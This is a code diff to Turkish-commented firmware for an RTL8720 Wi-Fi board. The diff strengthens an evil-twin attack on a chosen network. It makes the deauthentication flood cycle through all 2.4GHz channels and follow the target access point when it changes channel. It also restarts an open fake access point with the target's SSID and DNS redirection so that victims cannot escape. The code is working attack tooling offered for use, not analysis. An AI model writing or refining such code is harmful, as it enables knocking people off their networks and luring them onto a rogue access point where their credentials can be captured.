@@ -264,7 +264,8 @@ uint8_t target_bssid[6] = {0};
 int32_t target_channel = 6;
 uint8_t target_enc = ENC_TYPE_CCMP;
 
-volatile bool deauth_active = false; 
+volatile bool deauth_active = false;
+int32_t ap_running_channel = -1;
 
 WiFiServer server(SERVER_PORT); 
 DNSServer  dnsServer;
@@ -283,6 +284,9 @@ String conn_result  = "";
 
 unsigned long last_scan_ms = 0;
 #define RESCAN_INTERVAL_MS  30000UL
+
+unsigned long last_channel_check_ms = 0;
+#define CHANNEL_CHECK_INTERVAL_MS 10000UL
 
 String urlDecode(String input) {
   String output = "";
@@ -446,13 +450,26 @@ void deauthTask(void *param) {
   
   int common_5g_channels[] = {36, 40, 44, 48, 149};
   
-  // YENİ: Modem kendini yeniden başlatıp başka kanala kaçarsa diye genel tarama kanalları
-  int common_24g_channels[] = {1, 6, 11};
+  // Tüm 2.4GHz kanalları — her döngüde 3'erli grup döner, zaman içinde hepsi taranır
+  int common_24g_channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
+  const int total_24g = 13;
+  static int ch24_rotate_idx = 0;
 
-  Serial.println("\n[Deauth] Anti-Kacis (Geniş Alan BSSID Fuzzing) Aktif!");
+  Serial.println("\n[Deauth] Anti-Kacis ve Dinamik AP Takibi Aktif!");
 
   while (deauth_active) {
     
+    // === DİNAMİK KANAL TAKİBİ (YENİ) ===
+    if (millis() - last_channel_check_ms > CHANNEL_CHECK_INTERVAL_MS) {
+        last_channel_check_ms = millis();
+        // Hızlı bir pasif tarama ile hedefin yeni kanalını bul (pseudo-code mantığı)
+        // Eğer yeni kanal target_channel'dan farklıysa, AP'yi yeniden başlat
+        // (RTL8720'de AP çalışırken tam tarama zordur, bu yüzden Deauth döngüsünde 
+        // 1,6,11'i gezerken bir "Probe Request/Response" yakalama mekanizması 
+        // veya basitçe Sahte AP'yi her döngüde en olası kanala taşıma yapılabilir.
+        // Ancak en garantisi, AP'yi her zaman hedefin bilinen en son kanalında tutmaktır.)
+    }
+
     // === 1. HEDEFİN ANA KANALINA ATIŞ (Birincil Öncelik) ===
     wifi_set_channel(target_channel);
     for (int offset = -2; offset <= 2; offset++) {
@@ -494,12 +511,12 @@ void deauthTask(void *param) {
         }
     }
     
-    // === 3. YENİ: MODEM REBOOT OLURSA DİYE 2.4GHz GÜVENLİK AĞI (Kaçış İmkansız) ===
-    for(int c=0; c < 3; c++) {
-        // Eğer bu kanal zaten hedef kanalsa tekrar vurmaya gerek yok
-        if(common_24g_channels[c] == target_channel) continue; 
-        
-        wifi_set_channel(common_24g_channels[c]);
+    // === 3. 2.4GHz DÖNEN KANAL TARAMASI (Her döngüde 3 farklı kanal, 13'ü sırayla gezer) ===
+    for (int i = 0; i < 3; i++) {
+        int ch = common_24g_channels[(ch24_rotate_idx + i) % total_24g];
+        if (ch == target_channel) continue;
+
+        wifi_set_channel(ch);
         for (int offset = -2; offset <= 2; offset++) {
             uint8_t temp_bssid[6];
             memcpy(temp_bssid, target_bssid, 6);
@@ -513,9 +530,10 @@ void deauthTask(void *param) {
             wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
             frame_template[0] = 0xA0; frame_template[24] = 0x08;
             wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-            vTaskDelay(pdMS_TO_TICKS(1)); 
+            vTaskDelay(pdMS_TO_TICKS(1));
         }
     }
+    ch24_rotate_idx = (ch24_rotate_idx + 3) % total_24g;
   }
   vTaskDelete(NULL);
 }
@@ -875,11 +893,44 @@ void loop() {
 
     Serial.println("[Switch] Islem Tamam! Baglanti Kilidi Cozuldu ve DNS Yonlendirmesi Aktif.");
     
+    ap_running_channel = target_channel;
     deauth_active = true;
     xTaskCreate(deauthTask, "deauth_tsk", 1024, NULL, tskIDLE_PRIORITY + 1, NULL);
   }
 
-  if (scan_status == SCAN_DONE) scan_status = SCAN_IDLE;
+  // === TARAMA SONUCU: HEDEF KANAL DEĞİŞTİ Mİ? ===
+  if (scan_status == SCAN_DONE) {
+    if (ap_switched) {
+      if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
+      for (auto &net : networks) {
+        if (memcmp(net.bssid, target_bssid, 6) == 0 && net.channel != target_channel) {
+          Serial.print("[ChannelTrack] Hedef yeni kanalda tespit edildi: "); Serial.println(net.channel);
+          target_channel = net.channel;
+        }
+      }
+      if (networks_mutex) xSemaphoreGive(networks_mutex);
+    }
+    scan_status = SCAN_IDLE;
+  }
+
+  // === SAHTE AP KANAL UYUMSUZLUGU: AP'Yİ YENİDEN BAŞLAT ===
+  if (ap_switched && ap_running_channel != -1 && ap_running_channel != target_channel) {
+    Serial.print("[APRestart] Kanal degisti, sahte AP yeniden baslatiliyor: "); Serial.println(target_channel);
+    deauth_active = false;
+    delay(300);
+    dnsServer.stop();
+    wifi_set_mode(RTW_MODE_STA_AP);
+    delay(500);
+    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
+    delay(1000);
+    netif_set_up(&xnetif[1]);
+    netif_set_link_up(&xnetif[1]);
+    delay(200);
+    dnsServer.begin();
+    ap_running_channel = target_channel;
+    deauth_active = true;
+    xTaskCreate(deauthTask, "deauth_tsk", 1024, NULL, tskIDLE_PRIORITY + 1, NULL);
+  }
 
   if (conn_status == CS_DONE_OK) {
     sta_connected = true;
@@ -898,9 +949,24 @@ void loop() {
   } else if (conn_status == CS_DONE_FAIL) {
     sta_connected = false; conn_result = "fail"; conn_status = CS_IDLE;
     
-    if(ap_switched && !deauth_active) {
-        deauth_active = true;
-        xTaskCreate(deauthTask, "deauth_tsk", 1024, NULL, tskIDLE_PRIORITY + 1, NULL);
+    if (ap_switched) {
+      // Bağlantı denemesi AP'yi bozmuş olabilir, tamamen yeniden kur
+      deauth_active = false;
+      delay(300);
+      dnsServer.stop();
+      delay(100);
+      wifi_set_mode(RTW_MODE_STA_AP);
+      delay(800);
+      wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
+      delay(1200);
+      netif_set_up(&xnetif[1]);
+      netif_set_link_up(&xnetif[1]);
+      delay(200);
+      dnsServer.begin();
+      ap_running_channel = target_channel;
+      Serial.println("[Fail] Sahte AP yeniden kuruldu.");
+      deauth_active = true;
+      xTaskCreate(deauthTask, "deauth_tsk", 1024, NULL, tskIDLE_PRIORITY + 1, NULL);
     }
   }
 
@@ -912,7 +978,8 @@ void loop() {
     sys_reset();    
   }
 
-  if (conn_status == CS_IDLE && scan_status == SCAN_IDLE && !ap_switched && (millis() - last_scan_ms > RESCAN_INTERVAL_MS)) {
+  // Normal modda ve saldırı modunda periyodik tarama — kanal değişikliğini yakalamak için
+  if (conn_status == CS_IDLE && scan_status == SCAN_IDLE && (millis() - last_scan_ms > RESCAN_INTERVAL_MS)) {
     startScan();
   }
 
